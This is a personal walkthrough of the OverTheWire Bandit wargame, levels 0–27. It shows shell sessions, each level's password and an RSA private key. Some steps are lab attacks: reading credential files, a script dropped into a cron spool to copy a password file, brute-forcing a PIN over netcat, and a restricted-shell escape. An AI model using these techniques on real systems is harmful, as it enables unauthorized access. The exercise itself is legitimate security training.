https://overthewire.org/wargames/bandit/

# Level0
The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit0
```


# Level1
The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.


```Bash
bandit0@bandit:~$ more readme 
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```
```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit1
```

# Level2
The password for the next level is stored in a file called - located in the home directory

```Bash
bandit1@bandit:~$ more ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```
```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit2
```

# Level3
The password for the next level is stored in a file called spaces in this filename located in the home directory

```Bash
bandit2@bandit:~$ more spaces\ in\ this\ filename 
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```
```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit3
```


# Level4
The password for the next level is stored in a hidden file in the inhere directory.
```Bash
bandit3@bandit:~$ ls -a inhere/
.  ..  .hidden
bandit3@bandit:~$ more inhere/.hidden 
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```
```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit4
```

# Level5
The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.

```Bash
bandit4@bandit:~$ file ./inhere/*
./inhere/-file00: data
./inhere/-file01: data
./inhere/-file02: data
./inhere/-file03: data
./inhere/-file04: data
./inhere/-file05: data
./inhere/-file06: data
./inhere/-file07: ASCII text
./inhere/-file08: data
./inhere/-file09: data
bandit4@bandit:~$ more ./inhere/-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
bandit4@bandit:~$ 
```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit5
```

# Level6
The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:

- human-readable
- 1033 bytes in size
- not executable

```Bash
bandit5@bandit:~$ find -type f -size 1033c ! -executable 
./inhere/maybehere07/.file2
bandit5@bandit:~$ more ./inhere/maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit6
```

# Level7
The password for the next level is stored somewhere on the server and has all of the following properties:

- owned by user bandit7
- owned by group bandit6
- 33 bytes in size

```Bash
bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2> /dev/null
/var/lib/dpkg/info/bandit7.password
bandit6@bandit:~$ more /var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs


```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit7
```

# Level8
The password for the next level is stored in the file data.txt next to the word millionth

```Bash
bandit7@bandit:~$ grep "millionth" data.txt 
millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit8
```

# Level9
The password for the next level is stored in the file data.txt and is the only line of text that occurs only once

```Bash
bandit8@bandit:~$ sort data.txt |uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit9
```

# Level10
The password for the next level is stored in the file data.txt in one of the few human-readable strings, beginning with several ‘=’ characters.

```Bash
bandit9@bandit:~$ strings data.txt | grep "="
2========== the
========== password
>t=	yP
rV~dHm=
========== isa
=FQ?P\U
=	F[
pb=x
J;m=
=)$=
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
iv8!=

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit10
```

# Level11
The password for the next level is stored in the file data.txt, which contains base64 encoded data


```Bash
bandit10@bandit:~$ more data.txt | base64 -d
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit11
```

# Level12
The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions

```
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&input=R3VyIGNuZmZqYmVxIHZmIDVHcjhMNHFldFBFc1BrOGh0cWpoUks4WFNQNngyUkhoCg

The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit12
```
# Level13
The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)

```Bash
bandit12@bandit:/tmp/shunaroo$ xxd -r data.txt > revesehex
bandit12@bandit:/tmp/shunaroo$ ls
data.txt  revesehex
bandit12@bandit:/tmp/shunaroo$ file revesehex 
revesehex: gzip compressed data, was "data2.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/shunaroo$ mv revesehex revesehex.gz
bandit12@bandit:/tmp/shunaroo$ gunzip revesehex.gz 
bandit12@bandit:/tmp/shunaroo$ ls
data.txt  revesehex
bandit12@bandit:/tmp/shunaroo$ file revesehex 
revesehex: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/shunaroo$ bzip2 revesehex 
bandit12@bandit:/tmp/shunaroo$ ls
data.txt  revesehex.bz2
bandit12@bandit:/tmp/shunaroo$ file revesehex.bz2 
revesehex.bz2: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/shunaroo$ bzip2 -d revesehex.bz2 
bandit12@bandit:/tmp/shunaroo$ ls
data.txt  revesehex
bandit12@bandit:/tmp/shunaroo$ file revesehex 
revesehex: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/shunaroo$ bzip2 -d revesehex
bzip2: Can't guess original name for revesehex -- using revesehex.out
bandit12@bandit:/tmp/shunaroo$ ks
-bash: ks: command not found
bandit12@bandit:/tmp/shunaroo$ ls
data.txt  revesehex.out
bandit12@bandit:/tmp/shunaroo$ file revesehex.out 
revesehex.out: gzip compressed data, was "data4.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/shunaroo$ mv revesehex.out revesehex.gz
bandit12@bandit:/tmp/shunaroo$ gunzip revesehex.gz 
bandit12@bandit:/tmp/shunaroo$ ls
data.txt  revesehex
bandit12@bandit:/tmp/shunaroo$ file revesehex 
revesehex: POSIX tar archive (GNU)
bandit12@bandit:/tmp/shunaroo$ tar xvf revesehex
data5.bin
bandit12@bandit:/tmp/shunaroo$ file data5.bin 
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/shunaroo$ tar xvf data5.bin
data6.bin
bandit12@bandit:/tmp/shunaroo$ file data6.bin 
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/shunaroo$ bzip2 -d data6.bin
bzip2: Can't guess original name for data6.bin -- using data6.bin.out
bandit12@bandit:/tmp/shunaroo$ ls
data5.bin  data6.bin.out  data.txt  revesehex
bandit12@bandit:/tmp/shunaroo$ file data6.bin.out 
data6.bin.out: POSIX tar archive (GNU)
bandit12@bandit:/tmp/shunaroo$ tar xvf data6.bin.out
data8.bin
bandit12@bandit:/tmp/shunaroo$ file data8.bin 
data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/shunaroo$ gunzip data8.bin
gzip: data8.bin: unknown suffix -- ignored
bandit12@bandit:/tmp/shunaroo$ ls
data5.bin  data6.bin.out  data8.bin  data.txt  revesehex
bandit12@bandit:/tmp/shunaroo$ file data8.bin 
data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/shunaroo$ ls
data5.bin  data6.bin.out  data8.bin  data.txt  revesehex
bandit12@bandit:/tmp/shunaroo$ mv data8.bin data.gz
bandit12@bandit:/tmp/shunaroo$ gunzip data.gz
bandit12@bandit:/tmp/shunaroo$ ls
data  data5.bin  data6.bin.out  data.txt  revesehex
bandit12@bandit:/tmp/shunaroo$ file data
data: ASCII text
bandit12@bandit:/tmp/shunaroo$ more data
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```
```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit13
```

# Level14
The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on

```Bash
bandit13@bandit:~$ ssh localhost -l bandit14 -i ./sshkey.private 

bandit14@bandit:~$ more /etc/bandit_pass/bandit14 
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
```

# Level15
The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.

```Bash
bandit14@bandit:~$ more /etc/bandit_pass/bandit14| nc localhost 30000
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit15
```
# Level16
The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.

```Bash
bandit15@bandit:~$ echo "BfMYroe26WYalil77FoDi9qh59eK5xNr"|openssl s_client -connect localhost:30001 -quiet
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit16
```

# Level17
The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.

```Bash
bandit16@bandit:~$ nmap -sT localhost -p 31000-32000

Starting Nmap 7.40 ( https://nmap.org ) at 2020-01-25 16:27 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00026s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds

bandit16@bandit:~$ echo "cluFn7wTiGryunymYOu4RcffSxQluehd"|openssl s_client -connect localhost:31518 -quiet
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
^C
bandit16@bandit:~$ echo "cluFn7wTiGryunymYOu4RcffSxQluehd"|openssl s_client -connect localhost:31691 -quiet
139994541228096:error:141A10F4:SSL routines:ossl_statem_client_read_transition:unexpected message:../ssl/statem/statem_clnt.c:284:
bandit16@bandit:~$ echo "cluFn7wTiGryunymYOu4RcffSxQluehd"|openssl s_client -connect localhost:31790 -quiet
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
```

```Bash
vim id_rsa
chmod 400 id_rsa
ssh bandit.labs.overthewire.org -p 2220 -l bandit17 -i ./id_rsa
```

# Level18
There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new

```Bash
bandit17@bandit:~$ ls
passwords.new  passwords.old
bandit17@bandit:~$ diff passwords.new passwords.old 
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
> hlbSBPAWJmL6WFDb06gpTx1pPButblOA

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit18
```

# Level19


```Bash
[~]$ ssh bandit.labs.overthewire.org -p 2220 -l bandit18 "cat readme" 
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password: 
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit19
```

# Level20
To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.

```Bash
bandit19@bandit:~$ ls
bandit20-do
bandit19@bandit:~$ ./bandit20-do 
Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit:~$ ./bandit20-do more /etc/bandit_pass/bandit20 
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit20
```

# Level21
There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).

## step1
- open terminal1 and type like this

```Bash
bandit20@bandit:~$ nc -l -p 12345
```

## step2
- open terminal2 and type like this

```Bash
bandit20@bandit:~$ ./suconnect 12345
```

## step3
- type like this on the terminal1

```Bash
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```
- then reply the password from terminal2 process like below

```Bash
bandit20@bandit:~$ nc -l -p 12345
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit21
```


# Level22
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

```Bash
bandit21@bandit:~$ ls /etc/cron.d/.
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
bandit21@bandit:~$ ls /etc/cron.d/
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
bandit21@bandit:~$ more /etc/cron.d/cronjob_bandit22 
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ more /usr/bin/cronjob_bandit22.sh 
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ more /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit22
```

# Level23
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

```Bash
bandit22@bandit:~$ ls /etc/cron.d/
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
bandit22@bandit:~$ more /etc/cron.d/cronjob_bandit23 
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ more /usr/bin/cronjob_bandit23.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ more /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit23
```

# Level24
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

```Bash
bandit23@bandit:~$ more /etc/cron.d/cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ more /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done


bandit23@bandit:~$ echo "more /etc/bandit_pass/bandit24 >/tmp/4321.txt" > /tmp/1234.sh
bandit23@bandit:~$ chmod 777 /tmp/1234.sh
bandit23@bandit:~$ cp /tmp/1234.sh /var/spool/bandit24/
bandit23@bandit:~$ more /tmp/4321.txt
::::::::::::::
/etc/bandit_pass/bandit24
::::::::::::::
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit24
```

# Level25
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

```Bash
bandit24@bandit:~$ mkdir /tmp/shuna24
bandit24@bandit:~$ cd /tmp/shuna24
bandit24@bandit:/tmp/shuna24$ vi create_passwowrdlist.sh
bandit24@bandit:/tmp/shuna24$ more create_passwowrdlist.sh 
#!/bin/bash

passwd24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

for pin in {0000..9999}
do
	echo $passwd24 $pin >> passwordlist.txt
done

bandit24@bandit:/tmp/shuna24$ chmod +x create_passwowrdlist.sh 
bandit24@bandit:/tmp/shuna24$ ./create_passwowrdlist.sh 
bandit24@bandit:/tmp/shuna24$ ls
create_passwowrdlist.sh  passwordlist.txt
bandit24@bandit:/tmp/shuna24$ more passwordlist.txt |nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
・・・
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.

```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit25
```


# Level26


```Bash
bandit25@bandit:~$ more /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ more /usr/bin/showtext 
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```

// change terminal size to which can see a few line

```Bash

bandit25@bandit:~$ ssh localhost -l bandit26 -i ./bandit26.sshkey
Could not create directory '/home/bandit25/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes 
```
//press v

```bash
:set shell=/bin/bash

:shell
[No write since last change]
bandit26@bandit:~$ more /etc/bandit_pass/bandit26 
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

```

# Level27
Good job getting a shell! Now hurry and grab the password for bandit27!

```Bash
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ ./bandit27-do 
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ ./bandit27-do more /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
bandit26@bandit:~$ 


```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit27
```


# Levelx


```Bash


```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l banditx

# Level


```Bash


```

```Bash
ssh bandit.labs.overthewire.org -p 2220 -l banditx
``````













